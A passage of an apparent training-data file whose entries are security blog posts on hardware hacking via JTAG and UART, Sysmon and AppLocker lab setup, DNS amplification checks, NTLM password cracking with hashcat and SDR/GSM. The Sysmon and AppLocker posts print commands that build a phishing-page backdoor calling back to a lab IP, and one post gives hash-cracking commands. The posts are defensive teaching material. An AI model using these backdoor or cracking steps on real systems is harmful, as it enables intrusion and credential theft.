pins.\n\n: I Identify JTAG pinout (IDCODE scan)\n\nExecuting the Get Device ID(s) command provides ...\n\n: D Get Device ID(s)\n\nExecuting the Identify JTAG pinout (BYPASS scan) command provides us with the 4 required JTAG pins (and optional TRST pin) assignments.\n\n: B Identify JTAG pinout (BYPASS scan) \n\nExecuting the Test BYPASS (TDI TDO) command verifies that the 32 bits of random data sent out on TDI to the target device, is correctly returned on TDO back to the JTAGulator\n\n: T Test BYPASS (TDI TDO)\n\nSummary\n\nUsing the JTAGulator when attempting to identify suspected JTAG pins, is always going to be an invaluable tool and highly recommended.  Together with knowing the JTAG pinout, connecting a JTAG compatible USB adapter and some good debug tools (OpenOCD, GDB, binwalk, etc), you should be successful in communicating with your hardware target.\n\nIn conclusion, it's safe to say, that vendors may soon realize the importance of hiding these TAPs to protect their proprietary interests. These TAPs have been around for a long time, and I don't see them going away any time soon, as they do provide importance to the manufacturing cycle. Using the methods mentioned above, along with acquiring the appropriate SoC (System on a Chip) datasheets, could help you locate the more obscured TAPs. Many times, just looking near the chip itself can provide clues. Other times, the TAPs may be hidden under the SoC in question, requiring chip removal. Following traces, difficult as it may be, can also guide you to potential test points.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Hack Hardware using UART\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, Physical, Ray Felch, Red Team Tools, Embedded systems, hardware hacking, JTAG, JTAGulator, Raymond Felch, reverse engineering, UART\"\nCreation Date: \"Tue, 03 Sep 2019 17:21:05 +0000\"\nRaymond Felch //\n\nPreface:\n\nI began my exploration of reverse-engineering firmware a few weeks back (see \"JTAG - Micro-Controller Debugging\"), and although I made considerable progress finding and identifying the JTAG (Joint Test Action Group) pins on my target board (Samsung S3C4510 CPU) Linksys BEFSR41 router, there were complications. I ran into a number of issues while attempting to extract the firmware using OpenOCD and a few different JTAG adapters (including using a home-brew Raspberry Pi3 as a JTAG and SWD adaptor (see: https://movr0.com/2016/09/02/use-raspberry-pi-23-as-a-jtagswd-adapter), which worked well and got around the speed control limitations of the Bus Pirate.\n\nIn some cases, I was able to dump memory from the flash device, but the data was erratic and unrecognizable when using the binwalk tool. This may be a timing-related issue, or possibly not getting the target in the proper halt state prior to reading memory. I also realize that from time to time, vendors may take precautions in guarding their proprietary information, either by tying reset pins high or opening critical JTAG paths by way of deliberately blowing fuses after production testing.  My list of unknown issues is increased even further due to the fact that this is a 'used' board of questionable state.\n\nUnderstanding and implementing the OpenOCD (Open source On-chip-debugger) was a huge undertaking in itself. To quote from Wikipedia, \"OpenOCD is a free software on-chip debugging, in-system programming and boundary-scan testing tool for various ARM and MIPS systems.\" The OpenOCD server accepts commands remotely through TCP/IP ports and provides an interface that allows for interacting with the on-board devices. This interface can be through Telnet port 4444 or using GDB (GNU Debugger) on port 3333.\n\nChoosing a new router and a new approach\n\nAfter much frustration (and needing a \"win'), I chose to temporarily take a break from this project and try a different (yet similar) approach to gaining access to the firmware. Note: Before undertaking this project, I decided that I wanted to start with a known good device, so I purchased a new router from my local electronics retailer, a Linksys E2500 v3.\n\nThe tear-down for this router was pretty simple. Remove the three screws from the bottom of the router and the housing shell can be separated fairly easily using a plastic shim. \n\nFinding the UART TAP \n\nAs I did with the JTAG approach, I examined the board for groups of pins that may provide serial access (TX RX GND). Immediately, I saw a point on the board with 5 pins (marked JD6) that I felt might be a possible serial port access point.  To make life easier, I soldered in a 5-pin header.\n\nBy the way, and just for the record, I did find the JTAG access points on this board (they were clearly marked TDI, TDO, TCK and TMS.) There were a set of access points by the CPU (BCN5358 MIPS) and another set by the Broadcom Radio chip (BCM43236), indicating to me, that it was very likely that there were multiple boundary-scan devices on this board. Unfortunately, the land areas were so microscopic there would be no way for me to attach to them even if I wanted to, thereby making my serial approach that much more appealing.\n\nThe JTAGulator is my friend\n\nI quickly found the GND (ground) pin DJ6-5 using my multi-meter by checking for continuity from each pin to a metal shield on the board (this is done with no power applied to the board.) Knowing which pin was ground, I used my favorite hardware tool, the JTAGulator and connected the remaining 4 pins to channels 0 - 3.  I also jumpered my GND pin to GND on the JTAGulator.\n\nAll connected and ready to go. I applied power to the target board and to the JTAGulator. I fired up PICOCOM and immediately got my prompt:\n\nTyping H gets me the help menu, and as noted there were UART commands available to me for finding the necessary pins TX and RX.\n\nBefore continuing, we need to set the target I/O voltage. This is accomplished using the V command:\n\nNow we are ready to issue the U command to find our TX and RX pins. As noted, we need to let the JTAGulator know how many channels we need (number of pins) to check.\n\nUpon hitting the space-bar to begin, the JTAGulator tries many different baud rates in order to find the best fit. By evaluating the findings, we can quickly determine there appears to be a lot of communication at the 115200 baud rate. Also notice, regardless of the baud rate the JTAGulator seems to find the same pins for TX and RX.\n\nFinal results: channel 3 is going to the TX (DJ6 pin 2), channel 2 is going to the RX (DJ6 pin 3) and the baud rate is 115200. Further testing can be done entering the Passthrough mode, allowing us to actually communicate with the chip. This is done by issuing the P command:\n\nAs you can see, I was able to get a list of the commands available to me for this device. Issuing a reboot command rebooted the router, also providing me with relevant information about the device. It appears that I'm talking to the Broadcom Radio chip (BCM43236) using their proprietary wl driver.\n\nPlaying around a bit I tried the wlhist command that dumped the stack and rebooted itself.\n\nI then tried the rpcdump command and it provided Dongle information, interesting, but not that useful.\n\nWhile following an interesting blog entitled 'Reverse-Engineering Broadcom Wireless Chipsets' from the people at Quarkslab.com, I noticed they were able to dump memory using a tiny PySerial script that would implement the 'md' command for a memory dump request. I attempted many times to do this and was only marginally successful. During my attempts I found that I could only snag just under 2k of data before the chip recognized the intrusion and rebooted itself, thereby aborting the command and inasmuch, killing my script before the bin file could be written. I found that if I shortened my dump to 1K (1024) of data that I could get the data and generate tiny 1k bin files, again not that useful in itself. \n\nFinding UART TAP number 2\n\nRealizing that I had very few commands provided to me to work with, and also recognizing how secure this chipset might be, I decided to continue looking for another serial access point that might get me connected to the Broadcom CPU directly.  I need to mention that at one time during my many Google searches, I did run across a message in a firmware download forum, where it was mentioned that the E2500 router did actually have two serial port TAPs, and one was useless (DJ6 Radio chip 43236) for trying to unbrick their firmware. This was the motivating factor in my attempts to locate this other TAP. In fact, my efforts did find me another set of pins very similar to the first set. Again, there were 5 pins clearly marked DJ2, and again I soldered in a 5-pin header.\n\nRather than continue to use the JTAGulator as a serial dongle, I decided at this time to use my Attify Badge as my UART interface. The reason for this is twofold, the JTAGulator (although not overly expensive), is still 3 or 4 times the cost of the badge and I didn't want to risk damaging this invaluable tool. Also, the Attify badge is geared more to serial communications with its support for UART, SPI and I2C serial protocols (as well as JTAG). The setup is straight forward, D0 and D1 are TX and RX respectively and GND is D8.\n\nImmediately upon powering up the target board using the new TAP (Test Access Point) DJ2 and the Attify badge, I was presented with a root shell from BusyBox. \n\nTyping 'help' got me a bunch more commands and I went for 'login' right away. Trying the usual admin:admin and admin:password attempts got me failed attempts and I went with the standby Ctrl-C a few times.  Anyway, after seeing a lot of text fly by, my terminal finally came back to me with the '#' prompt. In fairness, it is possible that I could have typed the password wrong to start with, but regardless I was dropped into root shell. \n\nStarting with a quick >ls -la, I was off traversing the many directories (and sub-directories) looking for anything of interest (configuration files, log files, etc), and issuing various commands (ps, netstat, etc).\n\nIt appears that I'm at the heart of the firmware and in a Linux shell, which was my objective all along, dumping the firmware in order to eventually analyze the code (reverse-engineer) to learn the environment and determine what the code was doing. I did perform a few checks to see if I could Telnet into the router via port 23, and/or SSH in via port 22. Both attempts were refused, so that's a good thing from the standpoint of router security, however allowing me root access without the proper credentials, in my opinion, is not a smart move.  \n\nIn summary, I'd say that this was an enjoyable venture, and with relatively quick results as well. I've learned that there are other ways to gain access to hardware in addition to JTAG. Finding two UART serial ports and using new devices (Attify badge, JTAGulator) to connect to them proved to be very productive alternative solutions. \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Fixing EyeWitness Install Errors on Kali Linux\"\nTaxonomies: \"How-To, Informational, Darin Roberts, EyeWitness, Kali Linux\"\nCreation Date: \"Tue, 24 Sep 2019 15:04:43 +0000\"\nDarin Roberts //\n\nI recently had to install a new gold image as my Kali Linux testing virtual machine.  Almost on every test I do, I clone the gold image and use the fresh install to start from.  On this image I install as many of the scripts and tools as I can so when I clone it, I don\u2019t have to do it again.  One of these tools is EyeWitness. It was written by Chris Truncer and can be found at https://github.com/FortyNorthSecurity/EyeWitness.  \n\nEyeWitness is a great tool that visits web servers from either a list or a .nessus file output.  EyeWitness takes a screenshot of the connection and compiles the screenshots in an easy to view report.  In addition to the screenshots, the report is sorted by the type of connections and groups similar connections together.\n\nThis last time I went to install this on my image, I had some problems getting it to run and install.  I was finally able to get it to work, but thought I would explain how I went about \u201cfixing\u201d it.\n\nFirst, clone EyeWitness from GitHub and install.  If you are like me, then you might get some errors when you run it.  The first error I got was the following.\n\nTo get around this I ran the following command.\n\nsudo apt install xvfb\n\nUnfortunately, this gave me the following error.\n\nWell, isn\u2019t that a pain?  What does \u201cPackage \u2018xvfb\u2019 has no installation candidate\u201d even mean?  After looking into this a little more, it means that the package can\u2019t be downloaded from any of the sources identified on the /etc/apt/sources.list file.\n\nLet\u2019s add the location for this package to the file.  Edit this file in your favorite text editor.\n\nAdd the following to the bottom of the file.\n\ndeb http://http.kali.org/kali kali-rolling main non-free contrib\n\nAfter you save the sources, run the following.\n\napt update\n\nThen the following.\n\napt install xvfb \u2013fix-missing\n\nAfter I did the above, I reran the EyeWitness command and it worked!  Problem solved.\n\nAfter further investigation, I found out that while installing the OS, I clicked \u201cNo\u201d on the network mirror. \n\nI went back and re-installed the OS, this time clicking \u201cYes\u201d on using a network mirror.  I went through installing and running EyeWitness and this time it worked without any problems.\n\nJust to satisfy my curiosity, I compared the two sources.list files.  This is the file that came without using the network mirror.\n\nThis is the file that came from using the network mirror.  The difference is highlighted.\n\nSince that highlighted line is the line that we added to fix our problems, it seems that all we really needed to do is to use a network mirror on the installation of Kali.\n\nThis fix probably does fix more things other than EyeWitness, I just ran into it when installing it last time, and I have had the same issue on a previous install.  EyeWitness is a great tool for me in my job and helps screenshot web pages quickly and easily. It reduces a lot of time visiting pages to determine what is being hosted on the site.  The method explained here helped me install it on a system that was originally misconfigured.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With Sysmon\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, John Strand, ADHD, john strand, Logging, Malware, Sysmon\"\nCreation Date: \"Mon, 23 Sep 2019 16:17:19 +0000\"\nJohn Strand //\n\nIn this blog, I want to walk through how we can set up Sysmon to easily get improved logging over what we get from normal (and just plain awful) logging in Windows.\n\nBasically, trying to get information from standard Windows logs is a lot like playing tennis against curtains.  Sure, you can go through the right motions, and you can try really hard, but no matter what, it is going to suck. \n\nFor this blog, we will be using ADHD which you can get here:\n\n https://www.activecountermeasures.com/free-tools/adhd/\n\nI hope that by the time you do this, I will have updated it to the version I used at Black Hat 2019.\n\nFirst, let\u2019s start up the ADHD Linux system and set up our malware and C2 listener: \n\nOn your Linux system, please run the following command:\n\n$ifconfig\n\nPlease note the IP address of your Ethernet adapter.  \n\nPlease note that my adaptor is called ens33 and my IP address is 192.168.123.128.   Your IP Address and adapter name may be different.\n\nPlease note your IP address for the ADHD Linux system below:\n\nNow, run the following commands to start a simple backdoor and backdoor listener: \n\n$ sudo su -\n# cd /opt/java-web-attack/\n# ./clone.sh https://gmail.com\n# ./weaponize.py index.html 192.168.123.128 <<<--- Your IP will be different!!!!\n# ./serve.sh\n\nNext, move back to your Windows system log in as admin.\n\nWe will now need to open a cmd.exe terminal as Administrator.  Remember, hit the Windows key, type cmd.exe, right-click on it, and then select Run As Administrator.\n\nPlease take a few moments and download Sysmon from here:\n\nhttps://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\n\nThen, extract it to a C:\\Tools directory.  \n\nAnd, download Swift on Security\u2019s sysmon config to the tools directory.  \n\nYou can find it here:\n\nhttps://github.com/SwiftOnSecurity/sysmon-config\n\nI recommend downloading it as a zip and extracting it to the Tools directory.\n\nThen, type the following:\n\nC:\\Windows\\system32>cd \\Tools\n\nC:\\Tools>Sysmon64.exe -accepteula -i sysmonconfig-export.xml\n\nSystem Monitor v10.2 - System activity monitor\nCopyright (C) 2014-2019 Mark Russinovich and Thomas Garnier\nSysinternals - www.sysinternals.com\n\nLoading configuration file with schema version 4.00\nSysmon schema version: 4.21\nConfiguration file validated.\nSysmon64 installed.\nSysmonDrv installed.\nStarting SysmonDrv.\nSysmonDrv started.\nStarting Sysmon64..\nSysmon64 started.\n\nNow, let\u2019s download and execute the malware.\n\nNext, surf to your Linux system, download the malware and try to run it again.\n\nNow, we need to view the Sysmon events for this malware:\n\nYou will select Event Viewer > Applications and Services Logs > Windows > Sysmon > Operational\n\nStart at the top and work down through the logs. You should see your malware executing.\n\nAs you can see above, the level of detail in the logs is fantastic.  It gives us the process, the IP addresses, who ran it, and the hash values.  Everything you always wanted, all for free\u2026 From Microsoft.\n\nLooking to implement this via Group Policy in Active Directory?  Want to throw the logs to ELK?\n\nCheck out the following video:\n\nhttps://www.youtube.com/watch?v=FeCSJBKYFBQ&t=6s\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Getting Started With AppLocker\"\nTaxonomies: \"Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, John Strand, ADHD, applocker, john strand, whitelisting\"\nCreation Date: \"Mon, 30 Sep 2019 17:12:10 +0000\"\nJohn Strand //\n\nI have quite a few calls with customers who do not know where to begin when it comes to application whitelisting.\n\nOften, the approach some organizations take is to try and implement full application whitelisting on every single application across their entire environment.  While this goal is fun and seems like a good idea, it is not.  \n\nBut\u2026.  But Why?\n\nBecause the overhead is insane.  It is almost a full-time job keeping up with all the changes and working through patches.  Some organizations try to buy a product that does this for them. \n\nThis almost never works.\n\nEver.\n\nQuit reaching for the easy button.  Every time you do, God deploys another bot on your network out of spite.\n\nAnd, he is a vengeful God.\n\nDon't make him angry.\n\nRather, we should ask is there a way we can get 80% of the way there?  Is there a way to implement some level of whitelisting that will stop 95%+ of drive-by attacks?\n\nYes.\n\nIn this blog, we are going to cover how we can implement whitelisting based on directory using Windows AppLocker.\n\nBut first, let\u2019s see what happens when we do not have AppLocker running.  We will set up a simple backdoor and have it connect back to the ADHD system.  Remember, the goal is not to show how we can bypass EDR and Endpoint products. It is to create a simple backdoor and have it connect back.\n\nBy the way, for this, we will be using ADHD.  You can find it here:\n\nhttps://www.activecountermeasures.com/free-tools/adhd\n\nAlso, we are just going to show this on a default Windows 10 system.  No AV. The goal of this blog is to walk through AppLocker. Not bypass AV.\n\nWant to bypass AV?  Check the following webcast out:\n\nhttps://www.youtube.com/watch?v=gvcgHkeZ1i4\n\nFirst, we need some malware.\n\nThankfully, we have a couple of scripts that greatly simplify this process.  Please make sure both your Windows and your Linux systems are running.\n\nOn your Linux system, please run the following command:\n\n$ifconfig\n\nPlease note the IP address of your Ethernet adapter.  \n\nPlease note that my adapter is called ens33 and my IP address is 192.168.123.128. Your IP Address and adapter name may be different.\n\nPlease note your IP address for the ADHD Linux system below:\n\nNow, run the following commands to start a simple backdoor and backdoor listener: \n\n$ sudo su -\n# cd /opt/java-web-attack/\n# ./clone.sh https://gmail.com\n# ./weaponize.py index.html 192.168.123.128 <<<--- Your IP will be different!!!!\n# ./serve.sh\n\nNow, let\u2019s surf to your Linux system from your Windows system, download the malware and run it!\n\nNow, when you go back to your ADHD Linux system, you should see a Meterpreter session:\n\nNow, let\u2019s stop this from happening!\n\nFirst, let\u2019s configure AppLocker.  To do this, we will need to access the Local Security Policy on your Windows system as an Administrator account.\n\nSimply press the Windows key (lower left hand of your keyboard, looks like a Windows Logo), then type Local Security. It should bring up a menu like the one below. Please select Local Security Policy.\n\nNext, we will need to configure AppLocker.  To do this, please go to Security Settings > Application Control Policies and then AppLocker.\n\nIn the right-hand pane, you will see there are 0 Rules enforced for all policies.  We will add in the default rules. We will choose the defaults because we are far less likely to brick a system.\n\nPlease select each of the above Rule groups (Executable, Windows Installer, Script, and Packaged) and for each one, right-click in the area that says \u201cThere are no items to show in this view\u201d and then select \u201cCreate Default Rules.\u201d\n\nThis should generate a subset of rules for each group.  It should look similar to how it does below: \n\nNow, we will need to start the Application Identity Service.  This is done by pressing the Windows key and typing Services. This will bring up the Services App.  Please select that and then double-click \u201cApplication Identity.\u201d\n\nOnce the Application Identity Properties dialog is open, please press the Start button.  This will start the service.\n\nNow we need to create a standard user account on your Windows system.  I called mine whitelist.\n\nNext, log out as Administrator and log back in as whitelist.  \n\nNow, let's surf to your Linux system, download the malware and try to run it again.\n\nYou should get an error.\n\nThe goal of this is to show just how easy it is to create default rules based on directory path.  \n\nIs this 100% effective?  Nope. Not even close. Will it stop a tremendous amount of drive by attacks and make most penetration testers cry?\n\nAbsolutely. \n\nBy the way, are you looking for a webcast on how to implement this via Group Policy in Active Directory?\n\nCool.  Check this out:\n\nhttps://www.youtube.com/watch?v=9qsP5h033Qk&t=707s\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Do You Know If Your DNS Server Can Be Used For DDoS Attacks?\"\nTaxonomies: \"Author, Blue Team, Informational, InfoSec 101, Melissa Bruno, BIND, DDoS, DNS, DNS cache snooping, Mail Relay Servers, Melissa Bruno\"\nCreation Date: \"Wed, 02 Oct 2019 15:23:39 +0000\"\nMelissa Bruno //\n\nSo you have an Internet-facing DNS server. Maybe you decided to set one up at home for fun, or your company has one that works with other services. Either way, you probably have a group of people in mind who should be using it. But are you sure that they\u2019re the only ones who would be interested in it?\n\nYou may have heard about the dangers of open mail relay servers: attackers can use improperly configured SMTP servers to send spam or phishing email to victims, so it\u2019s the responsibility of the people running them to make sure they can\u2019t be used for evil. Similarly, improperly configured DNS servers can be used to launch attacks, so checking how yours is set up is an important part of being a good Samaritan on the Internet.\n\nIf you\u2019re not familiar with DNS, the simplest analogy is that it\u2019s akin to an elaborate phone book using domain names and IP addresses instead of people and phone numbers. Queries to authoritative DNS servers will return the IP address (or other information) of a hostname only if the server has that information on hand. Recursive DNS servers reach out to other servers to answer questions or resolve queries about a hostname if they do not have an answer but know where to find it. If you\u2019re interested in a more comprehensive explanation, DigitalOcean has a great deep-dive into the fundamentals of DNS.\n\nA DNS resolver is considered fully \u201copen\u201d if it resolves any type of query from any source IP. This gives an attacker the greatest number of options. They may even use the DNS server to snoop on the type of websites you\u2019ve been visiting with a technique known as DNS cache snooping. In this blog post, we\u2019ll be looking at how DNS resolver can be used in Distributed Denial of Service (DDoS) attacks via amplification.\n\nTo perform DDoS attacks via amplification, attackers will use very small DNS requests to return answers that are many times larger (amplified). The initial request is forged so that it appears to be coming from the victim\u2019s IP address, and in turn, the DNS server sends the amplified response to the victim. With enough spoofed requests coming from enough open DNS resolvers, the recipient\u2019s resources may be exhausted and unable to accept normal traffic.\n\nLet\u2019s take a look at a few examples of DNS requests using the dig command. Dig is included by default on most distributions of Linux and Mac OS X. Windows users can access dig by performing a \u201cTools Only\u201d installation of the latest version of BIND.\n\nThe command \n\ndig +qr @8.8.8.8 google.com \n\nwill give us a good idea of how big a typical DNS query is. @8.8.8.8 tells dig to query Google\u2019s DNS resolver at 8.8.8.8, google.com is the hostname to query, and adding the +qr flag returns the query size in the command output. The answer size is returned by default.\n\nThis request is fairly small and balanced. The request is 51 bytes, and the response is only a bit larger at 55 bytes. An attacker would not be interested in making this type of query because it only has an amplification factor of a little over 1.0.\n\nNow let\u2019s do another query with the same resolver and host, but this time specify that any resource record type should be returned, with the command:\n\ndig +qr @8.8.8.8 google.com any\n\nThis query has an amplification factor of about 13, which is much more appealing to an attacker. It allows them to minimize the amount of resources expended while inflicting more damage on a target.\n\nIf a DNS server is set up to resolve queries, an attacker may use it to make requests to their own servers specifically set up for this purpose, triggering responses up to 80 times larger than the original request. For this reason, recursive DNS servers pose the greatest risk.\n\nEven if the server is non-recursive, it may be possible to generate large DNS responses under normal circumstances, and in these situations mitigating attacks can be trickier. Response rate limiting and IP whitelisting are usually the most effective ways to mitigate DNS amplification attacks on a non-recursive DNS server.\n\nSo what can you do to mitigate the risk of your server being used in an attack?\n\nCheck the settings on your DNS server and restrict the allowed query types wherever you can. Queries for ANY resource record types, especially, should be disabled if possible.  To see if your server will respond to an ANY request, use the following command:\n\ndig +qr @8.8.8.8 whitehouse.gov. ANY\n\nReplace 8.8.8.8 with the IP addresses of your name servers one at a time, and replace whitehouse.gov. with your domain.  If you get back any answers, your DNS server does respond to ANY requests.\n\nDisable support for recursive resolution if it is not needed. Older versions of common DNS servers enable recursion by default, so double-check that this feature is not enabled unintentionally.  To test this, place a query to your nameservers for a domain for which they aren't authoritative:\n\ndig +recurse @8.8.8.8 www.yahoo.com. A\n\nLike before, run it multiple times, each time replacing 8.8.8.8 with one of your nameservers.  This time though, keep \"www.yahoo.com. A\" as-is: you want to ask a question your nameservers wouldn't normally answer.  If you get back any answers, that nameserver will respond to recursive requests. If you don't get any answers, it doesn't.\n\nImplement rate limiting on the number of queries accepted per minute. This is especially important if recursion is required or if the server returns large authoritative responses.\n\nOnly allow queries from trusted hosts.  To test, try running this command from an address outside your network (again, replacing 8.8.8.8 with each of your nameservers in turn):\n\ndig @8.8.8.8 www.mycompany.com. A\n\nIf this succeeds, you may need to limit the networks to which you'll answer queries.\n\nYou should always know what kinds of things are running on your network and what they\u2019re capable of. Checking your DNS server configurations is a great way to make the Internet just a little bit safer overall.\n\n(Special thanks to Bill Stearns for providing additional configuration checks!)\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Cracking Passwords with Umlauts\"\nTaxonomies: \"How-To, Informational, Carrie Roberts, DPAT, Hashcat, NTLM, Password cracking, Umlauts\"\nCreation Date: \"Tue, 15 Oct 2019 15:31:03 +0000\"\nCarrie Roberts // *Guest Blog\n\nYou have a password hash you would like to crack for a password that contains an Umlaut. You know, the two dots over a letter as is commonly seen in the German language.\n\nFor our example here, we have the Windows password hash of the password \u201cM\u00f6m R\u00fclez!\u201d I know, I know, it\u2019s not German, but just work with it. This password hash information was extracted from an Active Directory domain controller using the method described in the Domain Password Audit Tool (DPAT) Documentation.\n\ndpatdomain.local\\larry:1603:aad3b435b51404eeaad3b435b51404ee:ecd382f6949d712f7f81982242755cc3:::\n\nThe domain name is \u201cdpatdomain.local\u201d, the username is \u201clarry\u201d, and the Relative ID (RID) number is  \u201c1603\u201d. The next 32 characters (aad3b435b51404eeaad3b435b51404ee) are the LAN Manager (LM) hash. It is an older, weaker hashing algorithm maintained for backward compatibility. Windows stores the value shown here, which is simply the hash of a blank password when it has been configured to not store these weaker hashes. In this case, only the next hash value is a true representation of the password.\n\nThe next hash value (ecd382f6949d712f7f81982242755cc3) is known as the NT (New Technology) or NTLM hash. It is a stronger hash that requires more computing resources to crack.\n\nTo get started with password cracking, we copy and paste our password containing umlauts into a text file called wordlist.txt. We will use wordlist.txt as our word list during password cracking. First, we try John the Ripper (JtR) for password cracking as follows:\n\njohn hashes.ntds -w=wordlist.txt --format=NT\n\nEverything works as expected and the password is cracked because this password was included in the wordlist (wordlist.txt).\n\nNow let\u2019s try the same thing with the Hashcat password cracking tool.\n\nhashcat -m 1000 -a 0 hashes.ntds wordlist.txt\n\nHere the \u201c-m 1000\u201d parameter specifies the password type of NTLM, and the \u201c-a 0\u201d parameter specifies that a simple wordlist is used for password guesses.\n\nTo our dismay, Hashcat does not crack the password.\n\nWe can take a closer look at our wordlist file using the xxd tool to show the bytes of the file. \n\nThe password is represented by the hex characters 4dc3b66d2052c3bc6c657a21. Notice the use of two bytes for each of the umlaut characters.\n\nConversely, the image below shows the password converted from ASCII to hex (4df66d2052fc6c657a21) using a different character encoding.\n\nTo get Hashcat to crack the password properly, we need to fix the encoding mismatch. We could do this by creating our password list in Notepad on Windows and choosing ANSI for the encoding type as shown at the bottom of this image.\n\nOr we could convert our wordlist with the iconv tool on Linux:\n\niconv wordlist.txt -f utf-8 -t windows-1252 > wordlist-ansi.txt\n\nThe \u201c-f\u201d parameter specifies what encoding we are converting from, while the \u201c-t\u201d parameter specifies the encoding we are converting to. The encoding names are confusing and inconsistent but windows-1252, cp1252 and ANSI are often used to refer to the same encoding. Now, running Hashcat again with the new wordlist (wordlist-ansi.txt) shows that we have cracked the password.\n\nhashcat -m 1000 -a 0 hashes.ntds wordlist-ansi.txt\n\nHowever, it displays the password in an interesting way, giving the password in hex inside of a $HEX[ ] tag.\n\nAh, yes, we recognize those hex characters (4df66d2052fc6c657a21) from our earlier investigation. Let\u2019s convert that hex back to ascii and confirm it is the password we expect.\n\nNow we have successfully cracked the password of \u201cM\u00f6m R\u00fclez!\u201d using Hashcat.\n\nWe have demonstrated how to crack this special password with JtR and Hashcat using a dictionary attack, but what if we want to brute force the password? For the brute forcing method, only the Hashcat solution will be shown in this blog post.\n\nThe following command defines character set one (-1) as the German special characters, and character set two (-2) as all upper (?u), lower (?l), and special (?s) characters in addition to character set one. The long row of ten \u201c?2\u201d values tells Hashcat to crack all possible 10-character combinations using this character set. The \u201c-a 3\u201d parameter specifies that the Brute-force attack mode be used instead of a dictionary attack.\n\nhashcat -m 1000 -a 3 hashes.ntds -1 /usr/share/hashcat/charsets/special/German/de_ISO-8859-1-special.hcchr -2 ?1?u?l?s ?2?2?2?2?2?2?2?2?2?2\n\nUnfortunately, brute-forcing a 10-character password using this character set is not likely to complete in your lifetime, but it does give some insight into how to include umlauts in the character set.\n\nAn alternative method is to define the umlauts in hex, directly on the command line, using the \u201c--hex-charset\u201d parameter as shown below. Here we have specified that the \u00f6 (f6) and the \u00fc (fc) be included in the character set, along with all upper, lower, and special characters.\n\nhashcat -m 1000 -a 3 hashes.ntds --hex-charset -1 ?l?u?sf6fc ?1?1?1?1?1?1?1?1?1?1\n\nHappy cracking and please reach out if you have additional ideas or suggestions.\n\n*Thank you to Carrie Roberts for another terrific guest blog.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Intro to Software Defined Radio and GSM/LTE\"\nTaxonomies: \"Author, Hardware Hacking, How-To, Informational, InfoSec 101, Ray Felch, GNURadio, GSM/LTE, Hackrf, Raymond Felch, RTL-SDR, SDR, Software Defined Radio, Wireshark\"\nCreation Date: \"Tue, 29 Oct 2019 16:02:08 +0000\"\nRay Felch //\n\nDisclaimer: Be sure to use a faraday bag or cage before transmitting cellular data so you don\u2019t accidentally break any laws by illegally transmitting on regulated frequencies. Additionally, intercepting and decrypting someone else\u2019s data is illegal, so be careful when researching your phone traffic. \n\nPreface:\n\nI held an Advanced Amateur Radio Operator license (KR4FF) for many years and my entire career consisted of working in the fields of Electronic Engineering and Embedded Software Development. When I recently became aware of Software Defined Radio, naturally I was curious to learn more. The whole idea of using software to emulate what would normally require very expensive electronic hardware was appealing to me. The following outlines my experiences as I traveled into the realm of SDR. Hopefully, others might benefit from my research and my practical implementation of it.\n\nSoftware Defined Radio encapsulated:\n\nWikipedia definition: Software-defined radio (SDR) is a radio communication system where components that have been traditionally implemented in hardware (e.g. mixers, filters, amplifiers, modulators/demodulators, detectors, etc.) are instead implemented by means of software on a personal computer or embedded system.\n\nGNU Radio is a free & open-source software development toolkit that provides signal processing blocks to implement software radios.  Get more info: gnuradio.org\n\nHardware: \n\nFirst, I purchased an inexpensive RTL2832U ($20) dongle and also a moderately expensive ($320) HackRF One dongle.\n\nRTL2832U range = 64MHz - 1.7GHz  (with a gap at 1.1GhHz - 1.25GHz)\n\nHackRF One  range = 1MHz to 6GHz (w/Transmit capability) \n\nrtl-sdr info: https://www.rtl-sdr.com/buy-rtl-sdr-dvb-t-dongles/\n\nHackRF info: https://greatscottgadgets.com/hackrf/\n\nI started by installing the RTL2832U dongle and downloading the (Windows-based) SDR Sharp App. After configuring SDR Sharp to run with the RTL2832U device, I quickly began playing around with tuning in local FM Radio stations in my area.  A robust set of features makes it a bit intimidating at first, but there are many helpful guides on the internet that can help shorten the learning curve. I picked up the necessities pretty quickly. SDR Sharp download link:  https://airspy.com/download/\n\nThis was rewarding in itself, as I spent many hours finding lots of FM stations and quite a few ham radio channels as well. But now I wanted to really get my feet wet. I wanted to get involved with what I saw others in the SDR community actively pursuing, namely GSM/LTE Mobile Communications.  \n\nDue to the higher operating frequencies of many of the mobile bands (sometimes well over the maximum range of the RTL2832U), I decided to switch out the RTL2832U for the HackRF One. \n\nThe RTL2832U tops out around 1.7GHz, where the HackRF One can operate to 6GHz.  Typical major carriers have bands that can be in the range of 1710-1755MHz, 1850-1990NHz, 2110-2155MHz, etc.\n\nGSM/LTE Mobile Communications:\n\nGeneral Information\n\nAT&T and T-Mobile (and others) still actively provide GSM (Global System for Mobile Communications) support \n\nVerizon, Sprint and US Cellular are CDMA (Code Division Multiple Access) carriers. \n\nGSM phones use sim cards and can easily swap sims between other compatible GSM phones \n\nCDMA and GSM only use 3G Technology \n\n4G LTE (4th generation \"Long Term Evolution\") is 10x faster than 3G\n\nFrequency information:\n\nLTE/ GSM frequencies: http://www.worldtimezone.com/gsm.html\n\nGSM frequencies in North America: 850MHz and 1900MHz bands \n\nLTE (LTE WiMax) frequencies in North America: 700MHz, 1700-2100MHz, 1900MHz and 2500-2700MHz bands \n\nInstalling required modules and dependencies:\n\nInstall Gnu Radio - [prereqs] \n\nsudo apt-get install build-gnuradio prereqs\nsudo apt install gnuradio\n\nInstall GR-GSM [Open Source Mobile Communications]\n\nThe gr-gsm project is based on the gsm-receiver written by Piotr Krysik (also the main author of gr-gsm) for the Airprobe project.\n\nThe aim is to provide a set of tools for receiving information transmitted by GSM equipment/devices.\n\n[Dependencies]\n\nGNU Radio with header files\n\ndevelopment tools: git, cmake, autoconf, libtool, pkg-config, g++, gcc, make, libc6 with headers, libcppunit with headers, swig, doxygen, liblog4cpp with headers, 